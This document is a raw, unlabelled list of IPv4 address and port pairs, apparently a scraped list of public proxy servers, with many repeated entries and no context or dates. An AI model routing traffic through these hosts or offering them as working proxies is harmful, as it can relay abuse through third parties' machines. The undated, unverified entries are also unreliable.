5.35.81.55:32132
154.236.168.179:1976
167.71.199.228:8080
202.142.158.114:8080
186.150.202.130:8080
103.146.30.178:8080
138.0.91.227:999
124.222.122.46:7890
103.42.162.50:8080
123.56.106.161:8888
116.62.39.130:443
179.93.65.233:8080
178.124.189.174:3128
82.114.106.40:1256
181.209.102.43:999
183.111.25.253:8080
177.101.110.113:53281
121.156.109.108:8080
122.2.28.114:8080
41.178.6.118:8060
163.139.219.22:8080
185.246.153.10:3128
220.179.118.244:8080
45.172.111.11:999
181.143.106.162:52151
69.43.44.106:8080
86.110.27.165:3128
165.16.30.161:8080
217.30.170.213:3128
85.195.104.71:80
45.175.239.17:999
223.29.199.144:55443
95.216.194.46:1081
176.9.139.141:8080
93.188.161.84:80
36.95.133.234:8080
67.212.186.101:80
79.142.95.90:55443
177.124.184.52:8080
41.65.236.56:1981
183.89.115.221:8081
185.255.47.59:9812
136.228.239.67:8082
124.204.33.162:8000
190.90.8.74:8080
139.255.26.115:8080
61.19.145.66:8080
103.148.178.228:80
91.234.127.222:53281
103.159.196.215:1085
177.91.98.252:8080
34.142.54.87:80
41.65.236.44:1981
158.69.64.142:9300
103.119.95.254:4321
65.108.18.140:444
177.70.172.245:8080
154.85.35.235:8888
190.107.224.150:3128
5.160.121.142:8080
181.118.158.131:999
167.114.96.27:9300
45.174.240.61:999
158.69.53.132:9300
46.105.35.193:8080
159.65.133.175:31280
137.74.223.236:6036
223.71.195.72:9091
95.216.137.15:31337
181.192.2.23:8080
118.31.166.135:3128
20.239.2.157:80
43.255.113.232:86
103.141.247.6:8080
83.174.218.83:8080
213.230.69.193:3128
197.210.217.66:34808
27.116.51.119:8080
45.189.254.10:999
201.197.202.244:8080
188.170.62.82:81
185.220.181.50:8080
167.250.180.2:6969
187.188.169.169:8080
186.5.117.82:999
114.67.104.36:18888
103.159.68.147:8080
212.174.44.41:8080
45.172.111.89:999
180.183.226.187:8080
190.14.249.119:999
91.224.168.22:8080
112.78.32.62:3127
146.158.92.137:8080
181.224.207.20:999
193.68.152.102:8080
95.217.20.255:51222
157.230.34.219:3128
181.65.189.90:9812
188.133.137.9:8081
76.81.164.246:8080
131.72.68.107:40033
122.102.118.83:8080
39.99.54.91:80
45.145.20.213:3128
103.166.210.123:443
79.122.225.167:8080
89.208.35.81:3128
85.217.192.39:1414
46.191.235.167:443
188.133.157.61:10000
45.181.121.73:999
200.222.137.202:8080
37.210.128.139:8080
51.79.50.46:9300
117.54.11.82:3128
2.188.164.194:8080
67.73.184.178:8081
103.156.14.180:3127
50.231.95.3:8080
201.71.2.107:999
178.255.44.199:41890
41.186.44.106:3128
191.102.125.245:8080
1.179.144.41:8080
103.208.200.115:23500
118.179.9.26:8889
91.197.77.118:443
183.91.0.124:3128
103.180.126.28:8080
45.5.68.59:999
177.185.93.55:8080
201.184.176.107:8080
170.238.91.50:8080
186.3.44.182:999
41.203.83.66:8080
138.122.147.122:8080
103.109.57.250:8889
201.220.102.146:8080
125.99.114.105:40390
14.207.85.37:8080
200.105.215.18:33630
116.21.121.2:808
88.255.94.2:8080
176.62.178.247:47556
182.253.28.124:8080
112.133.215.24:8080
160.226.240.213:8080
88.255.65.117:8080
161.49.176.173:1337
43.250.127.98:9001
186.215.68.51:3127
93.171.192.28:8080
178.134.157.215:8080
190.60.36.61:8080
79.143.30.163:8080
185.15.172.212:3128
120.29.124.131:8080
103.7.27.186:8080
45.173.4.3:8081
103.173.128.51:8080
200.16.208.187:8080
115.96.208.124:8080
183.88.213.85:8080
170.239.222.89:8080
185.91.116.156:80
176.236.141.30:10001
31.173.10.58:3128
43.129.29.58:8090
206.189.136.49:3128
183.88.197.144:8080
212.126.106.230:8889
182.176.164.41:8080
185.82.99.206:9093
188.133.136.57:1256
188.165.59.127:3128
181.205.116.218:9812
78.29.36.210:9080
45.189.254.150:999
103.144.165.86:8080
190.6.54.5:8080
165.16.27.32:1981
182.253.65.17:8085
203.210.84.171:8181
202.180.20.66:8080
203.190.44.81:8090
151.106.18.122:1080
152.169.204.172:8082
103.164.112.124:10001
212.114.31.231:8080
151.22.181.214:8080
41.216.178.138:8090
66.29.154.103:3128
87.76.1.69:8080
179.1.77.222:999
170.83.78.1:999
151.22.181.215:8080
45.190.79.164:999
103.122.32.10:8080
181.57.192.245:999
177.105.232.114:8080
201.158.47.66:8080
179.191.245.170:3128
37.111.51.222:8080
14.177.235.17:8080
179.184.224.91:3128
117.198.97.220:80
212.174.44.156:8080
119.236.225.42:3128
195.250.92.58:8080
176.53.197.226:3128
103.131.18.119:8080
212.49.92.213:8080
187.216.73.18:8080
185.20.198.108:8080
95.217.72.247:3128
36.67.27.189:39674
181.129.98.146:8080
181.74.81.195:999
103.166.39.33:8080
103.120.175.119:9191
218.244.147.59:3128
103.156.248.12:8080
200.110.168.159:8080
103.169.187.201:8080
45.182.190.179:999
196.1.97.209:80
103.250.153.203:8080
193.163.116.3:8080
178.63.244.28:8083
139.255.77.74:8080
110.74.206.134:8080
154.64.211.145:999
36.94.2.138:443
194.233.73.105:443
183.88.232.207:8080
188.169.38.111:8080
105.243.252.21:8080
121.101.132.6:8080
103.16.69.126:83
103.120.175.47:9191
80.244.229.102:10000
151.106.18.124:1080
190.113.43.66:999
39.108.56.233:38080
188.0.147.102:3128
45.182.22.54:999
85.121.208.158:2019
49.156.42.210:8080
173.212.245.135:3128
200.229.147.2:999
103.163.236.78:8081
45.184.103.67:999
102.222.136.56:8080
185.255.46.121:8080
190.217.14.18:999
177.242.130.90:999
36.65.10.185:8080
103.106.112.18:1234
36.94.58.26:4480
138.121.113.182:999
190.186.18.177:999
190.61.41.106:999
45.180.10.197:999
91.233.111.49:1080
139.59.1.14:8080
1.20.166.142:8080
50.236.203.15:8080
200.32.51.179:8080
67.212.83.55:1080
122.3.41.154:8090
207.180.199.65:3128
103.152.232.234:8080
103.126.87.86:3127
222.64.109.23:9000
154.236.189.28:8080
181.205.106.106:9812
124.158.167.26:8080
67.212.186.102:80
203.76.114.197:8080
175.106.10.164:8089
5.189.140.161:3128
117.121.202.182:8099
92.60.238.12:8080
185.141.10.227:34082
61.135.155.82:443
195.140.226.244:8080
165.16.22.150:9999
201.28.39.6:3128
103.47.175.161:83
103.85.112.78:8090
41.254.49.146:8080
217.11.79.232:8080
66.94.116.111:3128
181.209.108.3:999
177.190.80.226:8080
101.128.86.22:8085
176.235.131.229:9090
67.212.83.54:1080
114.6.88.238:60811
165.0.50.110:8080
66.29.154.105:3128
67.212.186.99:80
103.156.128.28:8080
79.140.17.172:8016
5.9.210.36:9191
101.51.139.179:8080
200.54.22.74:8080
161.49.91.13:1337
200.24.159.163:999
170.210.4.222:37409
103.153.191.187:8080
138.59.187.33:666
91.150.189.122:30389
47.89.185.178:8888
88.255.64.94:8080
103.164.56.114:8080
102.66.104.192:9999
131.0.207.79:8080
103.178.43.14:8181
131.100.51.250:999
197.232.65.40:55443
66.94.97.238:443
51.15.42.134:8118
47.112.122.163:82
103.80.83.254:8181
95.214.123.200:8080
178.205.169.210:3128
103.243.114.206:8080
185.189.103.143:8080
197.246.171.158:8080
181.48.101.245:3128
190.2.210.186:999
66.181.164.125:8080
161.132.122.61:999
202.40.188.94:40486
152.231.25.114:8080
138.121.161.84:8096
79.111.191.130:41890
200.37.199.186:999
185.103.168.78:8080
103.227.141.90:8181
101.200.127.149:3129
177.126.151.162:8081
41.254.53.70:1981
79.129.147.177:8080
45.179.69.42:3180
182.90.224.115:3128
85.163.229.35:8081
36.94.161.219:8080
200.60.119.131:9991
203.112.223.126:8080
103.125.50.102:10001
152.231.25.198:60080
45.173.44.9:999
87.103.175.250:9812
180.191.20.102:8080
201.217.49.2:80
45.114.118.81:3128
200.106.184.12:999
45.248.41.216:9812
180.178.106.137:8080
45.172.111.20:999
45.175.239.85:999
47.89.153.213:80
79.147.98.145:8080
202.52.13.2:8089
222.129.141.180:9000
103.155.54.20:83
200.46.65.66:8080
204.199.72.90:999
23.229.21.168:3128
36.92.111.49:9812
185.204.197.169:8080
80.244.230.86:8080
110.74.195.34:25
80.65.28.57:30962
118.99.102.226:8080
200.105.170.214:8080
202.158.15.146:55667
203.190.44.10:3127
185.32.6.131:8090
159.65.69.186:9300
36.93.127.98:3128
43.228.125.189:8080
85.221.247.238:8080
64.210.67.19:999
113.160.241.196:19132
121.229.132.241:9999
49.232.237.134:8080
117.54.114.97:80
117.54.114.33:80
103.66.196.218:23500
212.3.216.8:8080
219.138.229.131:9091
95.104.54.227:42119
1.20.169.43:8080
109.167.245.78:8080
43.255.113.232:8083
45.149.43.56:53281
95.217.72.253:3128
91.67.201.74:8118
45.156.31.57:9090
157.119.211.133:8080
151.80.196.163:8010
8.215.38.183:8080
110.235.246.197:8080
216.155.89.66:999
113.111.212.9:9797
43.224.10.8:6666
69.75.140.157:8080
103.140.35.156:9812
200.69.78.90:999
191.102.74.113:8080
138.199.15.141:8080
188.168.28.88:81
103.156.144.5:83
124.158.175.26:8080
173.82.149.243:8080
149.34.2.39:8080
213.165.168.190:9898
103.78.162.68:9812
217.21.214.139:8080
177.54.229.1:9292
49.156.42.188:8080
202.77.120.38:57965
103.83.116.202:55443
183.88.52.181:8080
200.60.60.60:999
41.65.67.166:1976
91.238.52.18:7777
45.71.115.203:999
36.67.57.45:30066
173.197.167.242:8080
181.176.221.151:9812
54.39.102.233:3128
75.106.98.189:8080
190.119.211.42:9812
202.180.20.10:55443
194.233.73.108:443
213.171.63.210:41890
5.104.174.199:23500
43.255.113.232:8086
36.255.86.114:83
86.51.157.252:8080
200.69.74.166:6996
88.255.101.228:8080
79.120.177.106:8080
212.126.96.154:8080
37.237.205.30:9812
94.75.76.3:8080
102.38.17.101:8080
62.33.210.34:8333
103.159.46.14:83
181.224.207.21:999
222.173.172.94:8000
212.174.44.96:8085
177.136.32.214:45005
36.93.44.2:8080
124.158.167.173:8080
36.37.180.59:65205
103.164.99.58:8181
18.188.193.74:3128
159.89.200.210:8080
186.96.56.9:999
91.106.64.94:9812
187.62.191.3:61456
43.224.10.43:6666
45.6.4.58:8080
203.81.95.42:8080
190.186.1.121:999
38.65.138.28:999
47.92.113.71:80
115.127.95.82:8080
187.194.17.152:8080
201.222.45.65:999
103.47.66.154:8080
102.38.5.161:8080
8.242.150.90:999
170.233.235.249:3128
45.225.184.177:999
193.163.116.5:8080
41.65.236.48:1976
190.109.18.65:8080
103.228.246.37:3127
45.70.1.81:5566
183.88.212.184:8080
202.62.62.34:9812
178.254.18.170:3128
190.247.250.112:8080
45.145.20.213:80
202.138.240.189:8888
124.222.77.10:8080
43.225.185.154:8080
110.74.208.153:21776
183.88.219.206:41564
36.92.22.70:8080
190.104.180.94:999
27.72.149.205:8080
8.242.207.202:8080
139.59.244.166:8080
38.130.249.137:999
45.173.6.98:999
115.225.206.186:7890
118.67.219.153:8080
160.19.232.85:3128
62.182.114.164:60731
103.168.190.106:8080
45.186.60.246:8085
196.15.213.235:3128
203.130.23.250:8080
45.171.144.243:8083
45.172.111.12:999
202.180.17.86:8080
202.152.24.50:8080
190.11.192.118:999
43.250.107.91:80
202.62.11.197:8080
47.57.188.208:80
94.181.48.171:1256
103.149.162.195:80
36.91.166.98:8080
103.139.242.173:83
179.1.88.30:999
103.120.153.58:84
110.164.59.98:8080
103.48.71.124:83
201.91.82.155:3128
201.28.102.234:8080
45.185.206.73:999
103.35.132.18:83
186.71.151.42:1990
103.159.46.2:83
194.233.69.38:443
95.165.163.188:60103
36.95.73.141:80
184.82.54.174:8080
64.119.29.22:8080
45.226.28.1:999
103.147.77.66:3125
103.161.164.105:8181
91.235.75.33:8282
102.66.104.106:9998
187.109.40.193:20183
181.78.19.197:999
111.118.128.123:8080
103.59.213.29:8080
203.153.125.242:8080
119.42.86.186:8080
14.248.80.77:8080
201.71.2.41:999
1.10.141.220:54620
103.14.130.39:8080
161.117.89.36:8888
45.174.148.162:999
24.106.221.230:53281
200.39.136.129:999
213.81.199.8:4040
103.105.228.134:8080
202.162.214.243:8080
177.247.7.158:8080
202.152.51.44:8080
130.41.85.158:8080
103.156.225.178:3128
115.127.162.234:8080
183.5.87.242:9797
202.75.97.82:47009
45.177.109.220:999
176.102.69.35:8080
38.104.176.34:999
176.192.80.10:3128
189.193.224.222:999
110.235.249.226:8080
66.94.120.161:443
176.241.89.244:53583
189.203.234.146:999
103.173.172.1:8888
37.120.192.154:8080
190.186.18.161:999
185.94.215.18:8080
139.255.25.85:3128
36.94.142.165:8080
68.64.250.38:8080
170.246.85.108:50991
103.133.177.141:443
194.181.134.81:8080
123.25.15.209:9812
179.0.176.3:3180
202.147.206.98:8080
190.121.153.93:999
43.255.113.232:84
91.194.239.122:8080
152.231.25.195:60080
202.158.77.194:80
201.217.246.178:8080
202.164.152.229:8080
110.171.84.180:8080
36.95.133.236:8080
110.49.11.50:8080
201.120.27.15:53281
181.48.23.250:8080
177.101.55.34:9090
185.190.38.150:8080
37.18.73.85:5566
217.153.211.98:8080
190.113.41.220:999
194.233.69.90:443
103.70.79.3:8080
187.63.156.166:999
95.167.29.50:8080
178.49.151.33:8091
182.160.108.188:8090
103.242.106.146:3128
120.79.136.134:8080
200.106.184.13:999
43.155.111.39:80
196.3.99.162:8080
61.9.53.157:1337
79.143.179.141:3128
200.54.194.10:53281
45.189.117.237:999
103.60.173.6:8080
45.238.37.32:8080
103.97.46.214:83
187.45.127.87:20183
65.18.114.254:55443
128.201.213.232:8080
105.112.84.117:8080
36.91.216.243:8080
80.244.229.55:1256
41.193.84.196:3128
36.92.134.71:999
103.119.55.21:8082
190.14.238.198:999
103.159.90.42:83
181.114.192.1:3128
181.129.2.90:8081
175.100.72.95:57938
109.110.72.151:8080
36.95.173.178:8080
103.154.230.99:5678
103.106.219.135:8080
189.20.85.170:8080
103.215.207.54:81
119.42.152.252:8080
116.0.54.30:8080
103.161.164.101:8181
103.106.193.117:7532
185.136.151.138:41890
103.117.150.100:8080
197.251.233.122:8080
189.3.169.34:9812
201.182.85.242:999
51.103.137.65:80
96.30.79.84:8080
69.160.7.58:8080
45.165.131.46:8080
103.146.170.252:83
103.161.164.109:8181
200.24.146.68:999
42.180.225.145:10161
103.227.117.136:9812
103.78.170.13:83
138.117.110.244:999
202.145.13.109:8080
190.128.231.146:8080
138.94.188.124:8080
45.236.28.213:999
43.255.113.232:82
36.91.148.37:8080
74.205.128.200:80
202.142.126.6:8080
1.20.169.144:8080
138.117.84.240:999
118.173.56.31:80
213.6.149.2:8080
193.107.252.117:8080
45.231.170.137:999
181.209.77.130:8080
185.12.69.174:8080
41.242.116.235:50000
189.126.72.97:20183
146.59.199.12:80
168.196.215.16:9999
45.177.17.4:999
190.202.14.132:3128
102.66.108.1:9999
194.233.69.41:443
103.155.54.245:83
194.233.73.107:443
69.75.172.54:8080
194.233.69.126:443
43.224.10.13:6666
212.23.217.18:8080
45.202.16.126:8080
180.178.188.98:8080
178.252.184.142:8080
201.88.213.118:8080
157.100.53.102:999
200.43.13.23:8080
177.73.16.74:55443
45.161.115.250:999
102.68.128.214:8080
1.32.59.217:47045
183.89.9.34:8080
94.75.76.10:8080
194.233.73.106:443
170.83.242.250:999
2.56.62.76:3128
62.201.212.214:8080
41.75.85.22:8080
103.156.225.178:80
139.255.136.171:8080
190.26.217.98:999
69.230.221.141:1080
36.93.75.154:8080
182.253.82.157:8080
200.55.3.122:999
194.169.167.199:8080
110.44.124.220:55443
36.91.133.49:10000
212.174.44.87:8085
103.148.39.38:83
178.66.182.76:3128
45.224.153.39:999
62.94.218.90:8080
36.95.156.127:6969
177.183.234.110:3128
216.176.187.99:8886
36.95.53.227:8080
45.189.113.111:999
45.189.252.130:999
47.240.160.90:10001
152.231.29.51:8080
103.156.249.52:8080
46.219.80.142:57401
201.219.194.203:8080
98.154.21.253:3128
190.160.181.220:8118
177.136.84.164:999
200.69.88.5:999
103.196.233.199:8080
1.1.189.58:8080
45.182.41.12:8080
196.202.215.143:41890
85.196.179.34:8080
188.124.229.47:8080
45.229.162.146:55443
190.7.57.62:999
45.161.161.216:5566
103.155.19.97:8080
41.184.92.24:8080
103.132.55.174:8085
165.16.27.34:1981
103.76.12.42:8181
45.173.44.1:999
139.255.109.27:8080
103.17.246.148:8080
198.52.241.12:999
103.148.201.76:8080
213.6.66.66:48687
190.186.1.65:999
85.133.130.18:8080
186.103.203.202:999
45.184.73.114:40033
98.164.130.195:8080
103.124.87.1:8080
202.138.249.241:8000
146.59.83.187:80
175.100.103.170:55443
162.19.157.77:8001
222.252.156.61:62694
181.212.59.187:9812
189.202.249.202:9999
181.78.21.174:999
103.71.22.2:83
190.94.199.14:999
178.32.101.200:80
80.90.132.128:8888
190.69.153.82:999
179.49.163.2:999
103.161.164.107:8181
27.42.168.46:55481
43.255.113.232:8085
188.133.188.20:8080
202.169.229.139:53281
45.174.56.192:999
103.124.138.131:8085
103.221.254.102:48146
47.241.165.133:443
177.183.234.110:80
103.130.61.61:8081
110.78.112.198:8080
202.56.163.110:8080
103.159.90.14:83
45.70.14.58:999
45.127.56.194:83
116.254.116.99:8080
190.8.38.83:999
193.68.170.91:8080
36.93.133.170:8080
124.226.194.135:808
181.78.94.22:999
103.160.132.26:83
103.110.10.202:8080
103.175.237.9:3127
23.236.144.90:3128
103.231.200.229:3128
201.89.97.222:8080
36.95.142.26:8080
182.253.197.69:8080
120.72.20.225:8080
41.76.216.250:8088
82.147.118.164:8080
116.197.130.71:80
202.138.236.69:8080
103.31.235.74:9812
150.109.32.166:80
82.200.80.118:8080
45.167.90.21:999
200.42.203.96:8080
115.42.3.150:53281
212.112.127.20:8080
190.214.53.246:9812
103.145.57.50:8080
36.94.58.243:8080
103.152.232.233:8080
113.175.8.99:9812
103.1.93.184:55443
164.52.207.80:80
181.225.54.38:999
111.68.26.44:8080
113.160.37.152:53281
103.175.238.130:8181
95.38.80.36:8050
12.69.91.227:80
170.0.87.202:999
62.205.134.57:30001
188.133.138.197:8080
103.153.136.186:8080
114.7.193.214:8080
46.52.162.45:8080
103.37.141.69:80
181.143.191.138:999
179.105.126.16:9299
177.55.207.38:8080
190.61.48.25:999
176.123.1.84:3128
114.115.181.74:8080
180.178.111.221:8080
138.121.161.82:8099
220.132.0.156:8787
146.56.119.252:80
186.97.182.3:999
203.124.47.58:8080
36.67.52.35:8080
103.80.83.48:3127
119.15.86.130:8080
172.104.252.86:8021
161.35.78.6:80
62.33.207.202:3128
188.165.59.127:80
134.209.25.223:3128
62.182.66.251:9090
157.245.33.179:80
95.217.72.247:3128
45.79.27.210:1080
178.63.244.28:8083
5.189.140.161:3128
178.209.51.218:7829
45.56.83.46:80
64.227.62.123:80
62.33.207.202:80
82.179.248.248:80
168.8.172.2:80
52.226.135.84:80
51.250.80.131:80
206.189.23.38:8048
104.128.228.69:8118
134.209.29.120:8080
104.236.73.28:80
197.246.171.158:8080
217.30.170.213:3128
5.252.161.48:3128
51.15.100.229:3128
173.212.216.104:3128
207.180.199.65:3128
213.230.125.46:8080
185.61.152.137:8080
167.235.63.238:3128
103.127.1.130:80
85.214.71.122:8118
103.117.192.14:80
103.115.252.18:80
46.250.88.194:3128
169.57.1.85:8123
54.216.254.207:9000
120.77.65.221:30001
20.47.108.204:8888
120.77.27.85:30001
47.113.200.76:30001
123.56.222.253:30001
47.113.221.153:30001
66.94.116.111:3128
159.69.220.40:3128
47.97.126.226:30001
121.89.245.58:9000
77.39.117.17:80
87.76.1.69:8080
178.115.243.26:8080
5.9.112.247:3128
94.23.77.8:3128
50.205.202.249:3128
212.114.31.231:8080
39.104.27.232:80
65.21.206.151:3128
35.170.197.3:8888
45.189.254.82:999
12.151.56.30:80
91.202.230.219:8080
80.80.211.110:8080
95.217.72.253:3128
195.158.30.232:3128
189.199.106.202:999
103.117.231.42:80
46.191.235.167:443
8.213.137.21:6969
172.105.190.51:80
156.200.116.69:1976
103.115.26.254:80
103.197.251.202:80
80.179.140.189:80
109.194.101.128:3128
34.132.27.0:3128
35.188.27.245:8118
103.145.76.44:80
170.79.12.72:9090
157.245.167.115:80
195.29.76.14:8080
5.160.121.142:8080
157.100.12.138:999
198.167.196.118:8118
172.105.190.51:8017
193.107.252.117:8080
220.116.226.105:80
178.54.21.203:8081
173.212.245.135:3128
222.111.184.59:80
58.20.235.180:9091
203.243.51.111:8001
165.225.222.110:10605
178.32.223.222:8118
58.241.86.54:80
178.252.175.5:8080
156.200.116.68:1981
106.14.255.124:80
45.224.96.225:999
176.236.232.66:9090
213.212.210.252:1976
119.36.77.219:9091
39.107.33.254:8090
39.108.56.233:38080
46.246.4.13:8888
182.61.201.201:80
103.161.164.103:8181
103.241.182.97:80
18.231.133.109:3128
212.112.113.178:3128
139.59.1.14:8080
144.217.75.65:8800
67.212.186.101:80
154.85.58.149:80
62.171.177.80:3128
146.59.83.187:80
185.157.161.85:8118
139.255.109.27:8080
144.76.42.215:8118
173.249.38.220:80
61.79.139.30:80
139.78.97.154:80
103.134.177.182:8888
183.64.239.19:8060
219.138.229.131:9091
110.77.134.106:8080
94.140.242.221:8080
111.91.176.182:80
113.194.88.13:9091
195.189.123.213:3128
47.74.152.29:8888
91.107.15.221:53281
174.138.24.67:8080
175.141.151.191:8080
116.203.72.47:8118
204.137.174.64:999
139.9.64.238:443
47.180.214.9:3128
112.6.117.135:8085
209.166.175.201:8080
58.58.91.38:8060
47.112.122.163:82
122.9.101.6:8888
159.89.195.14:80
82.79.213.118:9812
106.158.156.213:80
121.37.145.63:8888
61.216.156.222:60808
222.65.228.80:8085
121.199.78.228:8888
113.214.4.8:84
213.230.97.10:3128
213.137.240.243:81
139.255.112.124:8181
80.85.86.247:1235
181.114.192.1:3128
103.209.230.129:8080
111.72.218.180:9091
121.101.133.73:8080
78.84.95.187:53281
36.94.142.163:8000
47.176.153.17:80
102.68.128.214:8080
103.166.39.33:8080
78.138.131.248:3128
80.246.128.14:8080
197.243.14.59:8888
178.205.169.210:3128
211.138.6.37:9091
45.161.115.45:999
124.131.219.92:9091
114.236.81.176:8008
138.117.230.140:999
58.246.58.150:9002
159.65.133.175:31280
120.220.220.95:8085
103.23.206.170:8080
183.236.123.242:8060
93.171.192.28:8080
218.89.51.167:9091
117.54.114.100:80
103.149.162.195:80
34.94.0.168:80
58.20.184.187:9091
41.161.92.138:8080
138.68.60.8:8080
43.250.107.91:80
138.59.165.72:999
124.226.194.135:808
152.89.216.110:3128
123.24.250.187:80
85.221.247.238:8080
181.63.213.66:8089
201.184.72.178:999
45.231.170.137:999
218.202.1.58:80
213.171.63.210:41890
41.65.236.56:1976
36.89.252.155:8080
218.253.141.178:8080
188.168.28.37:81
61.191.56.60:8085
163.172.85.150:9741
167.99.83.205:8118
178.236.223.250:8080
47.92.135.169:443
187.189.175.136:999
94.181.48.171:1256
103.231.78.36:80
183.91.0.124:3128
111.3.118.247:30001
103.133.26.107:8181
39.175.77.17:30001
223.96.90.216:8085
183.247.199.51:30001
5.252.161.48:8080
181.224.207.18:999
95.217.84.58:8118
181.48.101.245:3128
39.175.92.35:30001
186.176.212.214:9080
62.182.94.173:9812
183.247.202.208:30001
39.130.150.42:80
181.143.191.138:999
45.167.124.5:9992
89.232.202.106:3128
88.255.201.134:8080
45.153.165.118:999
67.212.83.55:1080
188.72.6.98:37083
41.65.236.37:1981
176.115.197.118:8080
200.116.198.222:9812
154.64.219.41:8888
179.1.73.100:999
188.170.62.82:81
181.224.207.21:999
46.249.123.169:6565
183.247.211.50:30001
111.3.118.177:30001
41.65.236.57:1976
129.226.17.43:80
183.247.199.126:30001
95.182.121.163:8080
178.216.24.80:55443
123.56.106.161:8888
47.89.153.213:80
194.233.77.110:6666
177.101.55.34:9090
200.125.223.142:9812
202.65.158.237:83
47.243.138.208:6677
41.242.116.235:50000
187.19.152.182:3128
185.148.223.76:3128
94.181.183.170:8080
49.232.237.134:8080
121.156.109.108:8080
193.41.88.58:53281
212.174.44.96:8085
1.1.189.58:8080
94.242.54.119:3128
91.106.64.94:9812
46.19.100.28:81
43.224.10.8:6666
45.190.79.160:999
104.37.102.181:8181
152.32.218.99:8000
174.139.41.164:9090
47.108.118.29:30001
206.62.64.34:8080
185.91.116.156:80
190.131.250.105:999
176.9.227.233:54545
197.157.219.169:48625
115.124.75.33:8080
52.236.90.60:3128
46.23.58.77:8080
202.169.37.244:8080
180.149.98.126:8080
156.200.116.76:1981
77.236.243.69:1256
1.224.3.122:3888
103.60.161.2:80
78.29.36.210:9080
51.250.17.27:8080
167.114.185.69:3128
81.169.142.254:3128
103.31.235.102:8080
170.238.91.50:8080
80.249.135.209:8080
185.51.10.19:80
115.87.154.67:8080
138.0.91.227:999
91.93.118.3:8090
41.178.6.118:8060
110.74.203.250:8080
103.19.58.113:8080
88.255.101.231:8080
38.10.247.122:999
190.7.57.61:999
200.7.11.154:8080
85.235.184.186:3129
51.79.50.46:9300
190.61.84.166:9812
45.161.115.48:999
223.82.60.202:8060
36.95.173.178:8080
95.216.194.46:1081
185.250.149.165:51787
103.152.100.183:8080
138.68.235.51:80
85.121.208.158:2019
213.230.69.193:3128
190.2.210.249:999
45.173.4.3:8081
47.113.90.161:83
12.144.254.185:9080
131.72.69.98:45005
170.83.76.57:999
91.67.201.74:8118
165.16.27.30:1981
190.12.57.46:8080
183.89.115.221:8081
124.222.122.46:7890
95.0.219.240:8080
24.172.82.94:53281
36.37.91.98:9812
190.119.199.20:57333
213.32.58.10:8081
117.54.114.102:80
165.16.27.51:1981
209.97.150.167:8080
210.212.227.68:3128
117.121.202.182:8099
183.88.212.184:8080
103.111.59.182:8080
80.249.135.89:8080
14.162.146.186:19132
45.127.56.194:83
91.106.65.107:9812
201.220.112.98:999
49.0.39.186:8080
128.201.213.232:8080
45.172.111.18:999
185.15.172.212:3128
103.120.175.47:9191
47.115.6.196:3389
101.200.127.149:3129
181.48.23.250:8080
185.103.168.78:8080
202.62.52.4:8080
162.0.226.218:80
47.74.226.8:5001
67.212.186.99:80
180.178.189.102:3127
41.216.177.34:8080
74.208.205.5:80
70.186.128.126:8080
201.182.85.242:999
193.163.116.5:8080
43.255.113.232:86
20.239.2.157:80
154.236.168.179:1976
36.92.140.113:8080
103.35.132.18:83
45.172.111.14:999
45.229.33.102:999
69.43.44.106:8080
45.181.122.74:999
45.156.31.19:9090
45.172.111.12:999
52.168.34.113:80
77.236.243.39:1256
176.102.69.35:8080
178.217.172.206:55443
91.235.75.33:8282
183.88.210.77:8080
77.235.17.180:8080
176.213.143.38:3128
201.222.45.64:999
114.7.193.214:8080
221.6.201.74:9999
102.66.161.210:9999
200.106.216.51:9947
154.113.32.26:8080
190.244.233.113:8080
200.92.152.50:999
102.38.5.233:8080
213.230.90.106:3128
201.89.89.34:8080
63.151.67.7:8080
80.90.132.128:8888
185.12.68.163:43393
103.14.72.21:8889
14.170.154.193:19132
185.220.181.50:8080
192.119.203.124:48678
143.208.58.92:8080
103.153.40.38:8080
200.108.229.137:8080
82.148.5.173:8888
36.67.57.45:30066
95.104.54.227:42119
41.84.135.102:8080
45.171.144.243:8083
50.236.203.15:8080
47.57.188.208:80
165.16.27.31:1981
77.65.112.162:8080
123.56.13.137:80
144.217.7.157:9300
195.158.3.198:3128
188.136.216.201:9080
95.216.194.46:1080
91.194.239.122:8080
103.168.190.106:8080
118.185.38.153:35101
180.193.216.213:8080
51.77.141.29:1081
45.127.56.194:82
202.152.51.44:8080
50.201.51.216:8080
176.196.250.86:3128
212.174.44.41:8080
190.121.140.233:999
165.16.27.34:1981
181.74.81.195:999
201.222.45.69:999
177.183.234.110:80
92.118.92.107:8181
41.57.37.12:8080
43.255.113.232:84
202.169.229.139:53281
43.255.113.232:83
201.217.246.178:8080
41.65.236.41:1976
181.143.235.94:999
178.88.185.2:3128
178.124.189.174:3128
180.191.22.200:8080
117.186.143.130:8118
185.32.6.131:8090
66.181.164.125:8080
80.87.217.6:8080
209.97.150.167:3128
193.163.116.3:8080
186.154.147.166:9812
88.255.64.75:1976
122.102.118.83:8080
43.255.113.232:8084
43.250.127.98:9001
185.189.199.75:23500
103.60.160.88:8080
103.227.141.90:8181
181.224.207.20:999
114.130.78.185:8080
43.243.174.3:82
103.147.77.66:5012
189.203.234.146:999
103.156.17.63:8181
182.72.203.255:80
103.156.225.178:8080
50.246.120.125:8080
167.99.124.118:80
188.168.28.88:81
200.55.250.16:6969
110.170.126.13:3128
134.122.58.174:80
103.130.5.34:8080
202.137.121.109:8080
95.0.206.22:8080
181.78.23.170:999
190.107.224.150:3128
190.14.238.198:999
181.129.183.19:53281
154.117.159.228:8080
103.250.166.12:6666
103.227.117.136:9812
185.211.6.165:10000
103.147.118.66:8080
103.163.231.189:8080
36.37.81.135:8080
150.129.171.35:30093
31.220.183.217:53281
176.236.141.30:10001
181.129.2.90:8081
213.230.127.141:3128
103.142.108.153:8080
203.81.87.186:10443
194.219.175.210:8080
157.100.53.110:999
190.61.101.205:8080
150.129.115.118:48071
190.109.205.253:999
179.1.73.102:999
103.216.82.20:6666
103.243.114.206:8080
45.182.190.179:999
41.254.53.70:1981
67.212.186.102:80
158.69.64.142:9300
109.121.55.162:8888
103.207.3.6:82
43.255.113.232:8083
186.148.184.130:999
43.255.113.232:8081
103.245.198.54:8080
105.243.252.21:8080
182.253.82.157:8080
27.255.58.74:8080
43.255.113.232:8082
112.78.32.62:3127
190.214.53.246:9812
46.0.203.186:8080
182.253.108.186:8080
190.60.32.206:999
130.41.85.158:8080
45.173.6.5:999
103.248.93.5:8080
103.181.245.130:80
118.99.96.173:8080
65.108.18.140:444
62.94.218.90:8080
103.24.125.33:83
190.109.168.217:8080
132.226.163.28:3128
62.171.188.233:8000
77.247.225.49:3128
200.106.184.13:999
88.255.64.75:1981
102.165.127.85:8080
122.155.165.191:3128
110.34.8.110:8080
170.83.79.105:999
87.103.202.248:3128
